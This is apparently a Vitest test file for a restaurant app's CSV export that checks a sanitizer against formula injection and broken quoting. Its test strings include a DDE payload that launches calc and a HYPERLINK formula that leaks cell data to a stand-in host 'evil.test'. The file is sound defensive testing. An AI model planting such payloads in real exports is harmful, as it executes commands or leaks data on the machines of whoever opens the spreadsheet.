import { describe, it, expect, beforeEach } from 'vitest';
import { sanitizeCsvCell, toCsvRow, toCsv } from '@jamanvaar/utils';
import { db, OrderRepository } from '@jamanvaar/database';
import { MenuBuilderService } from '@jamanvaar/business';

/**
 * B2-061: CSV/formula injection (CWE-1236). A value starting with =, +, - or @ is evaluated as
 * a formula the moment an exported CSV is opened in Excel/Sheets. Quoting alone (escaping an
 * internal ") does not defend against this — only prefixing the leading character does.
 */
describe('B2-061: CSV export formula-injection and quote safety', () => {
  it('prefixes every formula-trigger leading character with a neutralising apostrophe', () => {
    expect(sanitizeCsvCell('=1+1+cmd|\'/c calc\'!A0')).toBe("'=1+1+cmd|'/c calc'!A0");
    expect(sanitizeCsvCell('+1+1')).toBe("'+1+1");
    expect(sanitizeCsvCell('-1+1')).toBe("'-1+1");
    expect(sanitizeCsvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  it('reproduces the exact live-confirmed exploit string safely: quotes are escaped and the formula is neutralised', () => {
    const payload = '=HYPERLINK("http://evil.test?x="&A1,"Click")';
    const cell = sanitizeCsvCell(payload);
    // Escaped internal quotes and wrapped in quotes because it now contains a comma/quote.
    expect(cell).toBe(`"'=HYPERLINK(""http://evil.test?x=""&A1,""Click"")"`);
    // The literal string, unescaped, must never appear verbatim (that was the live-confirmed bug).
    expect(cell).not.toBe(`"${payload}"`);
    // A spreadsheet parser reading this cell back gets the neutralised, literal text, not a live formula.
    expect(cell.startsWith('"\'=')).toBe(true);
  });

  it('leaves an ordinary value completely untouched', () => {
    expect(sanitizeCsvCell('Priya Sharma')).toBe('Priya Sharma');
    expect(sanitizeCsvCell(410)).toBe('410');
    expect(sanitizeCsvCell(null)).toBe('');
    expect(sanitizeCsvCell(undefined)).toBe('');
  });

  it('escapes an internal quote even without a leading formula character (the CustomersCrmModule name/phone/email bug)', () => {
    // Before this fix, Name/Phone/Email were written as `"${value}"` with no .replace(/"/g, '""') —
    // unlike Address/Notes three lines below, which did escape. A literal " in a name desynchronised
    // the row's own column boundaries.
    expect(sanitizeCsvCell('Say "Hi" to Amit')).toBe('"Say ""Hi"" to Amit"');
  });

  it('quotes a field containing a comma or newline even with no special leading character', () => {
    expect(toCsvRow(['Gandhi Road, Ahmedabad'])).toBe('"Gandhi Road, Ahmedabad"');
  });

  it('toCsv builds a full document with \\r\\n line endings and a sanitized header', () => {
    const csv = toCsv(['Name', 'Amount'], [['=cmd|calc', 100], ['Rahul', 50]]);
    expect(csv).toBe("Name,Amount\r\n'=cmd|calc,100\r\nRahul,50");
  });

  it('MenuBuilderService.exportCSV() neutralises a formula-injection dish name end to end (B2-061 live repro)', () => {
    db.resetToDefaultSeed();
    const evilName = '=1+1+cmd|\'/c calc\'!A0';
    const category = db.categories[0];
    db.menuItems.push({
      id: 'menu-item-b2061-test',
      categoryId: category.id,
      name: evilName,
      sku: 'EVIL-01',
      price: 199,
      dietaryType: 'VEG',
      spiceLevel: 'MILD',
      description: '',
      imageUrl: '',
      isAvailable: true
    } as any);

    const csv = MenuBuilderService.exportCSV();
    // The raw, unescaped payload must never appear verbatim in the exported file.
    expect(csv).not.toContain(`"${evilName}"`);
    expect(csv).toContain("'=1+1+cmd");

    db.menuItems = db.menuItems.filter((m) => m.id !== 'menu-item-b2061-test');
  });
});
